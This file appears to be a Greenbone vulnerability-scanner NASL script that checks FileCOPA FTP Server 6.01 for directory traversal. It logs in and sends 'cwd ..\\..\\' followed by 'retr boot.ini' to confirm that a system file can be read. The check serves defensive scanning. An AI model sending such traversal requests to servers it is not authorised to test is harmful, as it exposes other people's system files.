# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801539");
  script_version("2025-07-16T05:43:53+0000");
  script_tag(name:"last_modification", value:"2025-07-16 05:43:53 +0000 (Wed, 16 Jul 2025)");
  script_tag(name:"creation_date", value:"2010-11-16 10:37:01 +0100 (Tue, 16 Nov 2010)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
  script_name("FileCOPA FTP Server Multiple Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42161");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15450/");
  script_xref(name:"URL", value:"http://h0wl.baywords.com/2010/11/08/filecopa-ftp-server-6-01-directory-traversal/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("Host/runs_windows", "ftp/intervations/filecopa/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files
  on the affected application.");

  script_tag(name:"affected", value:"FileCOPA FTP Server version 6.01.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain requests
  which can be exploited to download arbitrary files from the host system.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to FileCOPA FTP Server 6.01.01 or later.");

  script_tag(name:"summary", value:"FileCOPA ftp Server is prone to directory traversal vulnerabilities.");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(!banner || "InterVations FileCOPA FTP Server" >!< banner)
  exit(0);

soc1 = open_sock_tcp(ftpPort);
if(!soc1)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
if(login_details)
{
  pasvPort = ftp_get_pasv_port(socket:soc1);
  if(pasvPort)
  {
    soc2 = open_sock_tcp(pasvPort, transport:get_port_transport(ftpPort));
    if(soc2)
    {
      send(socket:soc1, data:'cwd ..\\..\\\r\n');
      result1 = ftp_recv_line(socket:soc1);

      send(socket:soc1, data:'retr boot.ini\r\n');
      result = ftp_recv_data(socket:soc2);

      if("[boot loader]" >< result && "\WINDOWS" >< result){
        security_message(port:ftpPort);
      }
    }

   close(soc2);
   ftp_close(socket:soc1);
  }
}
